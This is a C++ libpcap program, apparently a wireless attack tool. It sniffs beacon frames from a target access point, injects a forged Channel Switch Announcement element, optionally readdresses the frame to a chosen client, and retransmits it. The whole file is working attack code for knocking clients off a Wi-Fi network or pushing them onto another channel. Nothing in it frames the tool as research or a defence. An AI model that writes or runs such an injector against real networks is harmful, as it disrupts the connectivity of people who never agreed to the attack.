#include <array>
#include <cmath>
#include <csignal>
#include <cstring>
#include <sstream>
#include <iostream>
#include <optional>
#include <pcap/pcap.h>

#define FCS_SIZE 4

#define CONCAT_(a,b) a##b
#define CONCAT(a,b) CONCAT_(a,b)

#if __BYTE_ORDER__ == __ORDER_LITTLE_ENDIAN__
#define RNTOH_V_BODY(bit) return v
#else
#define __bswap_8(v)      (v)
#define RNTOH_V_BODY(bit) return CONCAT(__bswap_,bit)(v)
#endif
#define RNTOH_V(bit)                                                           \
    template<>                                                                 \
    CONCAT(CONCAT(uint,bit),_t) rntoh_v<>(const CONCAT(CONCAT(uint,bit),_t) v) \
    {                                                                          \
        RNTOH_V_BODY(bit);                                                     \
    }

template<typename T>
T rntoh_v(T v);

RNTOH_V(8);
RNTOH_V(16);
RNTOH_V(32);
RNTOH_V(64);

template<typename T>
struct alignas(1) littleendian
{
protected:
    T m_v;

public:
    littleendian(T v) : m_v(rntoh_v<T>(v))
    {
    }

    operator T() const
    {
        return rntoh_v<T>(m_v);
    }
};

typedef littleendian<uint8_t>  le1_t;
typedef littleendian<uint16_t> le2_t;
typedef littleendian<uint32_t> le4_t;
typedef littleendian<uint64_t> le8_t;


struct alignas(1) macaddr
{
private:
    std::array<uint8_t, 6> m_v;

public:
    explicit macaddr(const std::array<uint8_t, 6> v) : m_v(v)
    {
    }

    explicit macaddr(const std::string& str) : m_v()
    {
        sscanf( //NOLINT
            str.data(),
            "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &m_v[0], &m_v[1], &m_v[2],
            &m_v[3], &m_v[4], &m_v[5]);
    }

    [[nodiscard]]
    std::array<uint8_t, 3> oui() const
    {
        return { m_v[0], m_v[1], m_v[2] };
    }

    [[nodiscard]]
    std::array<uint8_t, 3> nic() const
    {
        return { m_v[3], m_v[4], m_v[5] };
    }

    explicit operator std::string() const
    {
        std::array<char, 18> buf{};
        sprintf(
            buf.data(),
            "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
            m_v[0], m_v[1], m_v[2],
            m_v[3], m_v[4], m_v[5]);
        return { buf.data() };
    }

    [[nodiscard]]
    bool operator ==(const macaddr other) const
    {
        return m_v == other.m_v;
    }

    [[nodiscard]]
    bool operator !=(const macaddr other) const
    {
        return m_v != other.m_v;
    }
};


enum
{
    RT_TSFT    = 0x01,
    RT_FLAGS   = 0x02,
    RT_RATE    = 0x04,
    RT_CHANNEL = 0x08,
    RT_EXT     = 0x80
};

struct alignas(1) radiotap
{
    le1_t revision;
    le1_t pad;
    le2_t length;
    le4_t present;
};

struct alignas(1) channel
{
    le2_t frequency;
    le2_t flags;
};

struct alignas(1) frame
{
    le2_t           framecontrol;
    le2_t           duration;
    mutable macaddr dst;
    macaddr         src;
    macaddr         bss;
    le2_t           seqencecontrol;
};

struct alignas(1) beacon
{
    le8_t timestamp;
    le2_t interval;
    le2_t capability;
};

enum
{
    BC_CSA = 0x25
};

struct alignas(1) csa
{
    le1_t mode;
    le1_t number;
    le1_t count;

    explicit csa(const le1_t channel) : mode(0), number(channel), count(0)
    {
    }
};

size_t alignup(const size_t p, const size_t a)
{
    const size_t r = p % a;
    return r ? p - r + a : p;
}

le1_t createchannel(const le2_t freq)
{
    uint8_t ch;
    switch (freq / 100)
    {
    case 2: // 2.4 GHz
        ch = (freq - 2412) / 5 + 1;
        if (ch == 15) ch = 14;
        break;
    case 3: // 802.11y
        ch = std::lround((static_cast<double>(freq) - 3657.5) / 2.5 + 131);
        break;
    case 5: // 802.11j
        ch = (freq - 5160) / 5 + 32;
        if (ch > 144) ch++;
        if (ch >= 176) ch -= 4;
        break;
    default:
        ch = (freq >> 8) ^ (freq & 0xF);
        break;
    }

    return ch ^ std::__rotl(ch, 4);
}

ssize_t compareexchange_csa(
    uint8_t*                     buffer,
    const size_t                 pktlen,
    const macaddr                target,
    const std::optional<macaddr> station)
{
    const auto rt = *reinterpret_cast<const radiotap*>(buffer);
    const auto fr = reinterpret_cast<const frame*>(buffer + rt.length);

    // COMPARE
    if (fr->bss != target)
    {
        errno = EAGAIN;
        return -1;
    }

    const channel* ch;
    {
        const auto* ppresent = reinterpret_cast<const decltype(rt.present)*>(buffer + offsetof(radiotap, present));
        auto        npresent = 0UL;
        for (; *ppresent & RT_EXT; ppresent++, npresent++)
        {
        }

        auto ofs = sizeof rt + npresent * 4;

        const auto flags = rt.present & 0x0F;
        if (flags & RT_TSFT)
            ofs = alignup(ofs, 8) + 8;
        if (flags & RT_FLAGS)
            ofs = alignup(ofs, 1) + 1;
        if (flags & RT_RATE)
            ofs = alignup(ofs, 1) + 1;
        if (~flags & RT_CHANNEL)
        {
            errno = EINVAL;
            return -1;
        }

        ofs = alignup(ofs, 2);

        ch = reinterpret_cast<const channel*>(buffer + ofs);
    }

    // EXCHANGE
    if (station.has_value())
        fr->dst = station.value();

    auto ofs = rt.length + sizeof *fr + sizeof(beacon);
    while (ofs < pktlen && buffer[ofs++] != BC_CSA)
        ofs += buffer[ofs++];
    if (ofs > pktlen) // why?
        ofs = pktlen;

    std::cout << pktlen << ' ' << ofs << ' ' << sizeof(csa) << std::endl;

    buffer[ofs++] = BC_CSA;
    buffer[ofs++] = sizeof(csa);
    *reinterpret_cast<csa*>(buffer + ofs) = csa(createchannel(ch->frequency));

    return static_cast<ssize_t>(ofs + sizeof(csa) + FCS_SIZE);
}


int main(int argc, char* argv[])
{
    if (argc < 3)
    {
        std::cout << "syntax: csa <interface> <ap-address> [<station-address>]" << std::endl
                  << "sample: csa wlan1 00:11:22:33:44:55" << std::endl;
        return -1;
    }

    static volatile bool token = true;

    std::array<char, PCAP_ERRBUF_SIZE> err{};
    pcap_pkthdr*                       hdr;
    const uint8_t*                     pkt;
    pcap_t*                            dev;
    std::array<uint8_t, BUFSIZ>        buf{};
    const macaddr                      ap(argv[2]);
    std::optional<macaddr>             station{};

    if (argc >= 4)
        station = macaddr(argv[3]);

    if (dev = pcap_open_live(argv[1], BUFSIZ, 1, 1, err.data()); !dev)
    {
        std::cerr << "Couldn't open device: " << err.data() << std::endl;
        return -1;
    }
    signal(SIGABRT, [] (int) -> void { token = false; });
    signal(SIGINT,  [] (int) -> void { token = false; });
    signal(SIGKILL, [] (int) -> void { token = false; });

    while (token)
    {
        if (const auto r = pcap_next_ex(dev, &hdr, &pkt); r == 0)
            continue;
        else if (r == PCAP_ERROR || r == PCAP_ERROR_BREAK)
        {
            std::cerr << "pcap_next_ex(): " << pcap_geterr(dev) << std::endl;
            break;
        }

        memcpy(buf.data(), pkt, hdr->caplen);
        const auto caplen = compareexchange_csa(buf.data(), hdr->caplen - FCS_SIZE, ap, station);
        if (caplen < 0)
        {
            if (errno != EAGAIN)
                perror("compareexchange_csa()");
            continue;
        }

        if (pcap_inject(dev, buf.data(), caplen) < 0)
        {
            std::cerr << "pcap_inject(): " << pcap_geterr(dev) << std::endl;
            break;
        }
    }

    pcap_close(dev);
    return 0;
}
